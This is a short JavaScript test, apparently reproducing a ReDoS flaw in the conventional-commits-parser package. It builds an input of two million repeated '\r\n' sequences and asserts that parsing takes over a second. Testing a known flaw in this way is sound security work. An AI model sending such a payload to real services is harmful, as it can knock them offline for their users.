test("ReDos in conventional-commits-parser", () => {
  const measureTime = require("../utils").measureTime;
  const conventionalCommitsParser = require("conventional-commits-parser");
  let payload = "b" + "\r\n".repeat(2000000) + "b";
  let t = measureTime(function () {
    conventionalCommitsParser(payload);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
